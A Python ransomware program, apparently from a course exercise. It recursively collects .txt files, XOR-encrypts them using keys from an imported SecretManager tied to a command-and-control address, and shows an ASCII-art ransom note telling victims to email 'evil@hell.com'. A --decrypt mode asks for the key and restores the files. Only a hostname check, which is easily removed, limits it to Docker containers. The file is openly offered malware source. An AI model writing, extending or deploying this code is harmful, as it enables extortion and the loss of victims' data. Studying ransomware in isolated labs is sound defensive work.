import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"



ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""

DECRYPT_MESSAGE = """
  _____                                      _
 / ____|                                    | |
| (___   _   _   ___   ___   ___  ___  ___  | |
 \___ \ | | | | / __| / __| / _ \/ __|/ __| | |
 ____) || |_| || (__ | (__ |  __/\__ \\__ \ |_|
|_____/  \__,_| \___| \___| \___||___/|___/ (_)

"""

class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter: str) -> list:
        base_path = Path(".")  
        return [str(file.absolute()) for file in base_path.rglob(filter) if not file.is_symlink()]
    
    def encrypt(self):
        # txt files
        files = self.get_files('*.txt')

        # Key Manager
        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
        secret_manager.setup()

        # Encrypt the files
        secret_manager.xorfiles(files)



    def decrypt(self):
        # instance of SecretManager
        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)

        # load local cryptographic elements
        secret_manager.load()

        # txt files
        txt_files = self.get_files("*.txt")

        while True:
            try:
                # ask the decryption key
                _key = input("What is the key to decrypt ? : ")

                # set the key
                secret_manager.set_key(_key)

                # decrypt the files 
                secret_manager.xorfiles(txt_files)

                # clean local cryptographic files
                secret_manager.clean()

                # inform the user that the decryption was successful
                print(DECRYPT_MESSAGE)

                # Exit the ransomware
                break
            except ValueError as error:
                # Inform the user that the key is invalid
                print(f"Error: {error}. The key is invalid.")

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()